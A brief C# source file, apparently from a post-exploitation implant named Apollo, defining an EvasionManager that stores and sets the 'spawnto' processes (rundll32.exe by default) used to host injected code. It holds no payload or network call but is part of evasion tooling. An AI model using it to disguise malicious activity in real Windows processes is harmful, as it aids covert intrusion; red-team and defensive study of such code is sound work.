#define COMMAND_NAME_UPPER

#if DEBUG
#undef SPAWNTO_x86
#undef SPAWNTO_X64
#define SPAWNTO_X86
#define SPAWNTO_X64
#endif

using Apollo.CommandModules;
using Apollo.Utils;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;


namespace Apollo.Evasion
{
    internal static class EvasionManager
    {
        internal static string SpawnTo64 { get; private set; } = "C:\\Windows\\System32\\rundll32.exe";
        internal static string SpawnTo86 { get; private set; } = "C:\\Windows\\SysWOW64\\rundll32.exe";
#if SPAWNTO_X64
        internal static bool SetSpawnTo64(string fileName)
        {
            bool bRet = false;
            if (FileUtils.IsExecutable(fileName))
            {
                SpawnTo64 = fileName;
                bRet = true;
            }
            return bRet;
        }
#endif
#if SPAWNTO_X86
        internal static bool SetSpawnTo86(string fileName)
        {
            bool bRet = false;
            if (FileUtils.IsExecutable(fileName))
            {
                SpawnTo86 = fileName;
                bRet = true;
            }
            return bRet;
        }
#endif
    }
}
